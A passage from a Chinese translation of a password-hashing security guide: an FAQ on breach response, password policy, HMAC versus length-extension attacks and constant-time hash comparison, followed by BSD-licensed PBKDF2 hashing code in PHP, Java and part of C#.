<p>向你的用户详细的说明他的密码是如何被保护的，希望是加盐的hash，即使密码进行了加盐hash保护，攻击者依然会进行字典和暴力攻击尝试破解hash。攻击者会使用发现的密码尝试登陆其他网站，因为用户可能在不同的网站都使用了相同的密码(所谓的撞库攻击)。告知你的用户存在的这些风险，建议他们修改使用了相同密码的地方。在自己的网站上，下次用户登陆的时候强制他们修改密码。大部分用户可能会尝试使用相同的密码，为了方便。要设计足够的逻辑避免这样的情况发生。</p>
<p>即使有了加盐的hash，攻击者也可能快速破解一些很弱的弱密码。为了降低这种风险，可以在使用正确密码的前提下，加一个邮件认证，直到用户修改密码。</p>
<p>还要告知你的用户有哪些个人信息存储在网站上。如果数据库包含信用卡信息，你需要通知你的用户注意自己近期的账单，并且最好注销掉这个信用卡。</p>
<p>应该使用怎样的密码策略，需要强制使用强密码么</p>
<p>如果你的服务不是有很严格的安全需求，那么不要限制你的用户。我建议在用户输入密码的时候显示它的强度等级。让用户自己决定使用什么强度的密码。如果你的系统有很强的安全需求，那么强制用户使用12位以上的密码，至少包含2个数字，2个字母，2个字符。</p>
<p>每6个月最多强制用户修改一次密码。超过这个次数，用户就会感到疲劳。他们更倾向于选择一个弱密码。更应该做的是教育你的用户，当他们感到自己的密码可能泄露的时候主动修改密码。</p>
<p>如果攻击者获取了数据库权限，他不能直接替换hash登陆任意账户么</p>
<p>当然，不过如果他已经或得了数据库权限，很可能已经可以获得服务器上的所有信息了。所以没有什么必要去修改hash登陆别人账户。进行密码hash的目的不是保护网站不被入侵，而是如果入侵发生了，可以更好的保护用户的密码。</p>
<p>在SQL注入攻击中，保护hash不被替换的方式使用两个用户不同权限的用户连接数据库。一个具有写权限，另外一个只具有只读的权限。</p>
<p>为什么需要一些特别的算法比如HMAC，而不是直接把密码和加密key拼接在一起</p>
<p>(这部分讲一些密码学的原理，翻译的不好请见谅)</p>
<p>hash函数，比如MD5,SHA1,SHA2使用了Merkle–Damgård construction，这导致算法可能长度扩展攻击(length extension attacks)。意思就是说给定一个hash H(X)，攻击者可以在不知道X的情况下，可以找到一个H(pad(X)+Y)的值，Y是个其他的字符串。pad(X)是hash函数使用的填充函数(padding function)。</p>
<p>这就意味者，对于hash H(key + message)，攻击者可以计算 H(pad(key + message) + extension)，并不需要知道加密key。如果这个hash是用在消息认证过程中，使用key为了避免消息被修改。这样的话这个系统就可能失效了，因为攻击者掌握了一个有效的基于 message+extension的hash。</p>
<p>这种攻击对于如何快速破解hash还不是很清楚。但是，基于一些风险的考虑，不建议使用单纯的hash函数进行加密key的hash。也许一个聪明的密码学家一天就可以找到使用这种攻击快速破解hash的方法。所以记得使用HMAC。</p>
<p>盐应该拼在密码的前面还是后面</p>
<p>这个不重要。选择一个并且保持风格一致就行了。实际中，把盐放在前面更常见一点。</p>
<p>为什么本文最后提供的hash代码使用了固定执行时间的函数来比较hash(length-constant)</p>
<p>使用固定的时间来比较hash是为了防止攻击者在线上的系统中使用基于时间差的攻击。这样攻击者就只能线下破解了。</p>
<p>比较两个字符串是否相同，标准的方式是先比较第一个字节，然后比较第二个字节，一次类推。只要发现有一个字节不同，那么这两个字符串就是不同了。可以返回false的消息了。如果所有字节比较下来都一样，那么这两个字符串就是相同的，可以返回true。这就意味了比较两个字符串，如果他们相同的长度不一样，花费的时间不一样。开始部分相同的长度越长，花费的时间也就越长。</p>
<p>基于这个原理，攻击者可以先找256个字符串，他们的hash都是以不同的字节开头。然后发送到目标服务器，计算服务器返回的时间。时间最长的那一个就是第一个字节hash是正确的。依次类推。攻击者就可能得到hash更多的字节。</p>
<p>这种攻击听起来好像在网络上实现起来比较困难。但是已经有人实现过了。所以我们在比较hash的时候采用了花费时间固定的函数。</p>
<p>本文提供的代码中 slowequals 函数是怎么工作的</p>
<p>上一回答讲到了我们需要比较时间固定的函数，这部分详细讲一下代码的实现。</p>
<pre><code><span class="number">1</span>.     <span class="keyword">private</span> <span class="keyword">static</span> boolean slowEquals(byte[] a, byte[] b)
<span class="number">2</span>.     <span class="comment">{
3.         int diff = a.length ^ b.length;
4.         for(int i = 0; i &lt; a.length &amp;&amp; i &lt; b.length; i++)
5.             diff |= a[i] ^ b[i];
6.         return diff == 0;
7.     }</span>
</code></pre><p>这段代码使用了异或(XOR)操作符”^”来比较整数是否相等，而没有使用”==”操作符。原因在于如果两个数完全一致，异或之后的值为零。因为 0 XOR 0 = 0, 1 XOR 1 = 0, 0 XOR 1 = 1, 1 XOR 0 = 1。</p>
<p>所以，第一行代码如果a.length等于b.length，变量diff等于0,否则的话diff就是一个非零的值。然后，让a，b的每一个字节XOR之后再跟diff OR。这样，只有diff一开始是0,并且，a，b的每一个字节XOR的结果也是零，最后循环完成后diff的值才是0,这种情况是a，b完全一样。否则最后diff是一个非零的值。</p>
<p>我们使用XOR而不适用”==”的原因是”==”通常编译成分支的形式。比如C代码”diff &amp;= a == b” 可能编译成下面的X86汇编。</p>
<pre><code><span class="keyword">MOV</span> <span class="literal">EAX</span>, [A]
<span class="keyword">CMP</span> [B], <span class="literal">EAX</span>
<span class="keyword">JZ</span> equal
<span class="keyword">JMP</span> done
<span class="label">equal:</span>
<span class="keyword">AND</span> [VALID], <span class="number">1</span>
<span class="label">done:</span>
<span class="keyword">AND</span> [VALID], <span class="number">0</span>
</code></pre><p>分支会导致代码执行的时间出现差异。</p>
<p>C代码的”diff |= a ^ b”编译之后类似于，</p>
<pre><code><span class="keyword">MOV</span> <span class="literal">EAX</span>, [A]
<span class="keyword">XOR</span> <span class="literal">EAX</span>, [B]
<span class="keyword">OR</span> [DIFF], <span class="literal">EAX</span>
</code></pre><p>执行时间跟两个变量是否相等没有关系。</p>
<p>为什么要讨论这么多关于hash的东西</p>
<p>用户在你的网站上输入密码，是相信你的安全性。如果你的数据库被黑了。而用户密码又没有恰当的保护，那么恶意的攻击者就可以利用这些密码尝试登陆其他的网站和服务。进行撞库攻击。(很多用户在所有的地方都是使用相同的密码)这不仅仅是你的网站安全，是你的所有用户的安全。你要对你用户的安全负责。</p>
<p>PHP PBKDF2 密码hash代码<br>代码下载</p>
<pre><code>&lt;?php
<span class="comment">/*
 * Password Hashing With PBKDF2 (http://crackstation.net/hashing-security.htm).
 * Copyright (c) 2013, Taylor Hornby
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without 
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, 
 * this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation 
 * and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE 
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
 * POSSIBILITY OF SUCH DAMAGE.
 */</span>
<span class="comment">// These constants may be changed without breaking existing hashes.</span>
define(<span class="string">"PBKDF2_HASH_ALGORITHM"</span>, <span class="string">"sha256"</span>);
define(<span class="string">"PBKDF2_ITERATIONS"</span>, <span class="number">1000</span>);
define(<span class="string">"PBKDF2_SALT_BYTE_SIZE"</span>, <span class="number">24</span>);
define(<span class="string">"PBKDF2_HASH_BYTE_SIZE"</span>, <span class="number">24</span>);
define(<span class="string">"HASH_SECTIONS"</span>, <span class="number">4</span>);
define(<span class="string">"HASH_ALGORITHM_INDEX"</span>, <span class="number">0</span>);
define(<span class="string">"HASH_ITERATION_INDEX"</span>, <span class="number">1</span>);
define(<span class="string">"HASH_SALT_INDEX"</span>, <span class="number">2</span>);
define(<span class="string">"HASH_PBKDF2_INDEX"</span>, <span class="number">3</span>);
function create_hash($password)
{
    <span class="comment">// format: algorithm:iterations:salt:hash</span>
    $salt = base64_encode(mcrypt_create_iv(PBKDF2_SALT_BYTE_SIZE, MCRYPT_DEV_URANDOM));
    <span class="keyword">return</span> PBKDF2_HASH_ALGORITHM . <span class="string">":"</span> . PBKDF2_ITERATIONS . <span class="string">":"</span> .  $salt . <span class="string">":"</span> .
        base64_encode(pbkdf2(
            PBKDF2_HASH_ALGORITHM,
            $password,
            $salt,
            PBKDF2_ITERATIONS,
            PBKDF2_HASH_BYTE_SIZE,
            <span class="keyword">true</span>
        ));
}
function validate_password($password, $correct_hash)
{
    $params = explode(<span class="string">":"</span>, $correct_hash);
    <span class="keyword">if</span>(count($params) &lt; HASH_SECTIONS)
       <span class="keyword">return</span> <span class="keyword">false</span>;
    $pbkdf2 = base64_decode($params[HASH_PBKDF2_INDEX]);
    <span class="keyword">return</span> slow_equals(
        $pbkdf2,
        pbkdf2(
            $params[HASH_ALGORITHM_INDEX],
            $password,
            $params[HASH_SALT_INDEX],
            (<span class="built_in">int</span>)$params[HASH_ITERATION_INDEX],
            strlen($pbkdf2),
            <span class="keyword">true</span>
        )
    );
}
<span class="comment">// Compares two strings $a and $b in length-constant time.</span>
function slow_equals($a, $b)
{
    $diff = strlen($a) ^ strlen($b);
    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($a) &amp;&amp; $i &lt; strlen($b); $i++)
    {
        $diff |= ord($a[$i]) ^ ord($b[$i]);
    }
    <span class="keyword">return</span> $diff === <span class="number">0</span>;
}
<span class="comment">/*
 * PBKDF2 key derivation function as defined by RSA's PKCS #5: https://www.ietf.org/rfc/rfc2898.txt
 * $algorithm - The hash algorithm to use. Recommended: SHA256
 * $password - The password.
 * $salt - A salt that is unique to the password.
 * $count - Iteration count. Higher is better, but slower. Recommended: At least 1000.
 * $key_length - The length of the derived key in bytes.
 * $raw_output - If true, the key is returned in raw binary format. Hex encoded otherwise.
 * Returns: A $key_length-byte key derived from the password and salt.
 *
 * Test vectors can be found here: https://www.ietf.org/rfc/rfc6070.txt
 *
 * This implementation of PBKDF2 was originally created by https://defuse.ca
 * With improvements by http://www.variations-of-shadow.com
 */</span>
function pbkdf2($algorithm, $password, $salt, $count, $key_length, $raw_output = <span class="keyword">false</span>)
{
    $algorithm = strtolower($algorithm);
    <span class="keyword">if</span>(!in_array($algorithm, hash_algos(), <span class="keyword">true</span>))
        trigger_error(<span class="string">'PBKDF2 ERROR: Invalid hash algorithm.'</span>, E_USER_ERROR);
    <span class="keyword">if</span>($count &lt;= <span class="number">0</span> || $key_length &lt;= <span class="number">0</span>)
        trigger_error(<span class="string">'PBKDF2 ERROR: Invalid parameters.'</span>, E_USER_ERROR);
    <span class="keyword">if</span> (function_exists(<span class="string">"hash_pbkdf2"</span>)) {
        <span class="comment">// The output length is in NIBBLES (4-bits) if $raw_output is false!</span>
        <span class="keyword">if</span> (!$raw_output) {
            $key_length = $key_length * <span class="number">2</span>;
        }
        <span class="keyword">return</span> hash_pbkdf2($algorithm, $password, $salt, $count, $key_length, $raw_output);
    }
    $hash_length = strlen(hash($algorithm, <span class="string">""</span>, <span class="keyword">true</span>));
    $block_count = <span class="built_in">ceil</span>($key_length / $hash_length);
    $output = <span class="string">""</span>;
    <span class="keyword">for</span>($i = <span class="number">1</span>; $i &lt;= $block_count; $i++) {
        <span class="comment">// $i encoded as 4 bytes, big endian.</span>
        $last = $salt . pack(<span class="string">"N"</span>, $i);
        <span class="comment">// first iteration</span>
        $last = $xorsum = hash_hmac($algorithm, $last, $password, <span class="keyword">true</span>);
        <span class="comment">// perform the other $count - 1 iterations</span>
        <span class="keyword">for</span> ($j = <span class="number">1</span>; $j &lt; $count; $j++) {
            $xorsum ^= ($last = hash_hmac($algorithm, $last, $password, <span class="keyword">true</span>));
        }
        $output .= $xorsum;
    }
    <span class="keyword">if</span>($raw_output)
        <span class="keyword">return</span> substr($output, <span class="number">0</span>, $key_length);
    <span class="keyword">else</span>
        <span class="keyword">return</span> bin2hex(substr($output, <span class="number">0</span>, $key_length));
}
?&gt;
java PBKDF2 密码hash代码
代码下载

<span class="comment">/* 
 * Password Hashing With PBKDF2 (http://crackstation.net/hashing-security.htm).
 * Copyright (c) 2013, Taylor Hornby
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without 
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, 
 * this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation 
 * and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE 
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
 * POSSIBILITY OF SUCH DAMAGE.
 */</span>

<span class="keyword">import</span> java.security.SecureRandom;
<span class="keyword">import</span> javax.crypto.spec.PBEKeySpec;
<span class="keyword">import</span> javax.crypto.SecretKeyFactory;
<span class="keyword">import</span> java.math.BigInteger;
<span class="keyword">import</span> java.security.NoSuchAlgorithmException;
<span class="keyword">import</span> java.security.spec.InvalidKeySpecException;

<span class="comment">/*
 * PBKDF2 salted password hashing.
 * Author: havoc AT defuse.ca
 * www: http://crackstation.net/hashing-security.htm
 */</span>
<span class="keyword">public</span> class PasswordHash
{
    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">String</span> PBKDF2_ALGORITHM = <span class="string">"PBKDF2WithHmacSHA1"</span>;

    <span class="comment">// The following constants may be changed without breaking existing hashes.</span>
    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="built_in">int</span> SALT_BYTE_SIZE = <span class="number">24</span>;
    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="built_in">int</span> HASH_BYTE_SIZE = <span class="number">24</span>;
    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="built_in">int</span> PBKDF2_ITERATIONS = <span class="number">1000</span>;

    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="built_in">int</span> ITERATION_INDEX = <span class="number">0</span>;
    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="built_in">int</span> SALT_INDEX = <span class="number">1</span>;
    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="built_in">int</span> PBKDF2_INDEX = <span class="number">2</span>;

    <span class="comment">/**
     * Returns a salted PBKDF2 hash of the password.
     *
     * @param   password    the password to hash
     * @return              a salted PBKDF2 hash of the password
     */</span>
    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">String</span> createHash(<span class="keyword">String</span> password)
        <span class="keyword">throws</span> NoSuchAlgorithmException, InvalidKeySpecException
    {
        <span class="keyword">return</span> createHash(password.toCharArray());
    }

    <span class="comment">/**
     * Returns a salted PBKDF2 hash of the password.
     *
     * @param   password    the password to hash
     * @return              a salted PBKDF2 hash of the password
     */</span>
    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">String</span> createHash(<span class="built_in">char</span>[] password)
        <span class="keyword">throws</span> NoSuchAlgorithmException, InvalidKeySpecException
    {
        <span class="comment">// Generate a random salt</span>
        SecureRandom <span class="built_in">random</span> = <span class="keyword">new</span> SecureRandom();
        <span class="built_in">byte</span>[] salt = <span class="keyword">new</span> <span class="built_in">byte</span>[SALT_BYTE_SIZE];
        <span class="built_in">random</span>.nextBytes(salt);

        <span class="comment">// Hash the password</span>
        <span class="built_in">byte</span>[] hash = pbkdf2(password, salt, PBKDF2_ITERATIONS, HASH_BYTE_SIZE);
        <span class="comment">// format iterations:salt:hash</span>
        <span class="keyword">return</span> PBKDF2_ITERATIONS + <span class="string">":"</span> + toHex(salt) + <span class="string">":"</span> +  toHex(hash);
    }

    <span class="comment">/**
     * Validates a password using a hash.
     *
     * @param   password        the password to check
     * @param   correctHash     the hash of the valid password
     * @return                  true if the password is correct, false if not
     */</span>
    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">boolean</span> validatePassword(<span class="keyword">String</span> password, <span class="keyword">String</span> correctHash)
        <span class="keyword">throws</span> NoSuchAlgorithmException, InvalidKeySpecException
    {
        <span class="keyword">return</span> validatePassword(password.toCharArray(), correctHash);
    }

    <span class="comment">/**
     * Validates a password using a hash.
     *
     * @param   password        the password to check
     * @param   correctHash     the hash of the valid password
     * @return                  true if the password is correct, false if not
     */</span>
    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">boolean</span> validatePassword(<span class="built_in">char</span>[] password, <span class="keyword">String</span> correctHash)
        <span class="keyword">throws</span> NoSuchAlgorithmException, InvalidKeySpecException
    {
        <span class="comment">// Decode the hash into its parameters</span>
        <span class="keyword">String</span>[] params = correctHash.<span class="built_in">split</span>(<span class="string">":"</span>);
        <span class="built_in">int</span> iterations = Integer.parseInt(params[ITERATION_INDEX]);
        <span class="built_in">byte</span>[] salt = fromHex(params[SALT_INDEX]);
        <span class="built_in">byte</span>[] hash = fromHex(params[PBKDF2_INDEX]);
        <span class="comment">// Compute the hash of the provided password, using the same salt, </span>
        <span class="comment">// iteration count, and hash length</span>
        <span class="built_in">byte</span>[] testHash = pbkdf2(password, salt, iterations, hash.length);
        <span class="comment">// Compare the hashes in constant time. The password is correct if</span>
        <span class="comment">// both hashes match.</span>
        <span class="keyword">return</span> slowEquals(hash, testHash);
    }

    <span class="comment">/**
     * Compares two byte arrays in length-constant time. This comparison method
     * is used so that password hashes cannot be extracted from an on-line 
     * system using a timing attack and then attacked off-line.
     * 
     * @param   a       the first byte array
     * @param   b       the second byte array 
     * @return          true if both byte arrays are the same, false if not
     */</span>
    <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">boolean</span> slowEquals(<span class="built_in">byte</span>[] a, <span class="built_in">byte</span>[] b)
    {
        <span class="built_in">int</span> diff = a.length ^ b.length;
        <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; a.length &amp;&amp; i &lt; b.length; i++)
            diff |= a[i] ^ b[i];
        <span class="keyword">return</span> diff == <span class="number">0</span>;
    }

    <span class="comment">/**
     *  Computes the PBKDF2 hash of a password.
     *
     * @param   password    the password to hash.
     * @param   salt        the salt
     * @param   iterations  the iteration count (slowness factor)
     * @param   bytes       the length of the hash to compute in bytes
     * @return              the PBDKF2 hash of the password
     */</span>
    <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] pbkdf2(<span class="built_in">char</span>[] password, <span class="built_in">byte</span>[] salt, <span class="built_in">int</span> iterations, <span class="built_in">int</span> bytes)
        <span class="keyword">throws</span> NoSuchAlgorithmException, InvalidKeySpecException
    {
        PBEKeySpec spec = <span class="keyword">new</span> PBEKeySpec(password, salt, iterations, bytes * <span class="number">8</span>);
        SecretKeyFactory skf = SecretKeyFactory.getInstance(PBKDF2_ALGORITHM);
        <span class="keyword">return</span> skf.generateSecret(spec).getEncoded();
    }

    <span class="comment">/**
     * Converts a string of hexadecimal characters into a byte array.
     *
     * @param   hex         the hex string
     * @return              the hex string decoded into a byte array
     */</span>
    <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] fromHex(<span class="keyword">String</span> <span class="built_in">hex</span>)
    {
        <span class="built_in">byte</span>[] <span class="built_in">binary</span> = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="built_in">hex</span>.length() / <span class="number">2</span>];
        <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">binary</span>.length; i++)
        {
            <span class="built_in">binary</span>[i] = (<span class="built_in">byte</span>)Integer.parseInt(<span class="built_in">hex</span>.substring(<span class="number">2</span>*i, <span class="number">2</span>*i+<span class="number">2</span>), <span class="number">16</span>);
        }
        <span class="keyword">return</span> <span class="built_in">binary</span>;
    }

    <span class="comment">/**
     * Converts a byte array into a hexadecimal string.
     *
     * @param   array       the byte array to convert
     * @return              a length*2 character string encoding the byte array
     */</span>
    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">String</span> toHex(<span class="built_in">byte</span>[] array)
    {
        BigInteger bi = <span class="keyword">new</span> BigInteger(<span class="number">1</span>, array);
        <span class="keyword">String</span> <span class="built_in">hex</span> = bi.toString(<span class="number">16</span>);
        <span class="built_in">int</span> paddingLength = (array.length * <span class="number">2</span>) - <span class="built_in">hex</span>.length();
        <span class="keyword">if</span>(paddingLength &gt; <span class="number">0</span>)
            <span class="keyword">return</span> <span class="keyword">String</span>.format(<span class="string">"%0"</span> + paddingLength + <span class="string">"d"</span>, <span class="number">0</span>) + <span class="built_in">hex</span>;
        <span class="keyword">else</span>
            <span class="keyword">return</span> <span class="built_in">hex</span>;
    }

    <span class="comment">/**
     * Tests the basic functionality of the PasswordHash class
     *
     * @param   args        ignored
     */</span>
    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args)
    {
        <span class="keyword">try</span>
        {
            <span class="comment">// Print out 10 hashes</span>
            <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)
                System.out.<span class="built_in">println</span>(PasswordHash.createHash(<span class="string">"p\r\nassw0Rd!"</span>));

            <span class="comment">// Test password validation</span>
            <span class="built_in">boolean</span> failure = <span class="keyword">false</span>;
            System.out.<span class="built_in">println</span>(<span class="string">"Running tests..."</span>);
            <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)
            {
                <span class="keyword">String</span> password = <span class="string">""</span>+i;
                <span class="keyword">String</span> hash = createHash(password);
                <span class="keyword">String</span> secondHash = createHash(password);
                <span class="keyword">if</span>(hash.equals(secondHash)) {
                    System.out.<span class="built_in">println</span>(<span class="string">"FAILURE: TWO HASHES ARE EQUAL!"</span>);
                    failure = <span class="keyword">true</span>;
                }
                <span class="keyword">String</span> wrongPassword = <span class="string">""</span>+(i+<span class="number">1</span>);
                <span class="keyword">if</span>(validatePassword(wrongPassword, hash)) {
                    System.out.<span class="built_in">println</span>(<span class="string">"FAILURE: WRONG PASSWORD ACCEPTED!"</span>);
                    failure = <span class="keyword">true</span>;
                }
                <span class="keyword">if</span>(!validatePassword(password, hash)) {
                    System.out.<span class="built_in">println</span>(<span class="string">"FAILURE: GOOD PASSWORD NOT ACCEPTED!"</span>);
                    failure = <span class="keyword">true</span>;
                }
            }
            <span class="keyword">if</span>(failure)
                System.out.<span class="built_in">println</span>(<span class="string">"TESTS FAILED!"</span>);
            <span class="keyword">else</span>
                System.out.<span class="built_in">println</span>(<span class="string">"TESTS PASSED!"</span>);
        }
        <span class="keyword">catch</span>(Exception ex)
        {
            System.out.<span class="built_in">println</span>(<span class="string">"ERROR: "</span> + ex);
        }
    }

}
ASP.NET (C#)密码hash代码
代码下载

<span class="comment">/* 
 * Password Hashing With PBKDF2 (http://crackstation.net/hashing-security.htm).
 * Copyright (c) 2013, Taylor Hornby
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without 
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, 
 * this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation 
 * and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE 
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
 * POSSIBILITY OF SUCH DAMAGE.
 */</span>

using System;
using System.Text;
using System.Security.Cryptography;

namespace PasswordHash
{
    <span class="comment">/// &lt;summary&gt;</span>
    <span class="comment">/// Salted password hashing with PBKDF2-SHA1.</span>
    <span class="comment">/// Author: havoc AT defuse.ca</span>
    <span class="comment">/// www: http://crackstation.net/hashing-security.htm</span>
    <span class="comment">/// Compatibility: .NET 3.0 and later.</span>
    <span class="comment">/// &lt;/summary&gt;</span>
    <span class="keyword">public</span> class PasswordHash
    {
        <span class="comment">// The following constants may be changed without breaking existing hashes.</span>
        <span class="keyword">public</span> <span class="keyword">const</span> <span class="built_in">int</span> SALT_BYTE_SIZE = <span class="number">24</span>;
        <span class="keyword">public</span> <span class="keyword">const</span> <span class="built_in">int</span> HASH_BYTE_SIZE = <span class="number">24</span>;
        <span class="keyword">public</span> <span class="keyword">const</span> <span class="built_in">int</span> PBKDF2_ITERATIONS = <span class="number">1000</span>;

        <span class="keyword">public</span> <span class="keyword">const</span> <span class="built_in">int</span> ITERATION_INDEX = <span class="number">0</span>;
        <span class="keyword">public</span> <span class="keyword">const</span> <span class="built_in">int</span> SALT_INDEX = <span class="number">1</span>;
        <span class="keyword">public</span> <span class="keyword">const</span> <span class="built_in">int</span> PBKDF2_INDEX = <span class="number">2</span>;

        <span class="comment">/// &lt;summary&gt;</span>
        <span class="comment">/// Creates a salted PBKDF2 hash of the password.</span>
        <span class="comment">/// &lt;/summary&gt;</span>
        <span class="comment">/// &lt;param name="password"&gt;The password to hash.&lt;/param&gt;</span>
        <span class="comment">/// &lt;returns&gt;The hash of the password.&lt;/returns&gt;</span>
        <span class="keyword">public</span> <span class="keyword">static</span> string CreateHash(string password)
        {
            <span class="comment">// Generate a random salt</span>
            RNGCryptoServiceProvider csprng = <span class="keyword">new</span> RNGCryptoServiceProvider();
            <span class="built_in">byte</span>[] salt = <span class="keyword">new</span> <span class="built_in">byte</span>[SALT_BYTE_SIZE];
            csprng.GetBytes(salt);

            <span class="comment">// Hash the password and encode the parameters</span>
            <span class="built_in">byte</span>[] hash = PBKDF2(password, salt, PBKDF2_ITERATIONS, HASH_BYTE_SIZE);
            <span class="keyword">return</span> PBKDF2_ITERATIONS + <span class="string">":"</span> +
                Convert.ToBase64String(salt) + <span class="string">":"</span> +
                Convert.ToBase64String(hash);
        }

        <span class="comment">/// &lt;summary&gt;</span>
        <span class="comment">/// Validates a password given a hash of the correct one.</span>
        <span class="comment">/// &lt;/summary&gt;</span>
        <span class="comment">/// &lt;param name="password"&gt;The password to check.&lt;/param&gt;</span>
        <span class="comment">/// &lt;param name="correctHash"&gt;A hash of the correct password.&lt;/param&gt;</span>
        <span class="comment">/// &lt;returns&gt;True if the password is correct. False otherwise.&lt;/returns&gt;</span>
        <span class="keyword">public</span> <span class="keyword">static</span> bool ValidatePassword(string password, string correctHash)
        {
            <span class="comment">// Extract the parameters from the hash</span>
            <span class="built_in">char</span>[] delimiter = { <span class="string">':'</span> };
            string[] <span class="built_in">split</span> = correctHash.Split(delimiter);
            <span class="built_in">int</span> iterations = Int32.Parse(<span class="built_in">split</span>[ITERATION_INDEX]);
            <span class="built_in">byte</span>[] salt = Convert.FromBase64String(<span class="built_in">split</span>[SALT_INDEX]);
            <span class="built_in">byte</span>[] hash = Convert.FromBase64String(<span class="built_in">split</span>[PBKDF2_INDEX]);

            <span class="built_in">byte</span>[] testHash = PBKDF2(password, salt, iterations, hash.Length);
            <span class="keyword">return</span> SlowEquals(hash, testHash);
        }

        <span class="comment">/// &lt;summary&gt;</span>
        <span class="comment">/// Compares two byte arrays in length-constant time. This comparison</span>
        <span class="comment">/// method is used so that password hashes cannot be extracted from</span>
        <span class="comment">/// on-line systems using a timing attack and then attacked off-line.</span>
        <span class="comment">/// &lt;/summary&gt;</span>
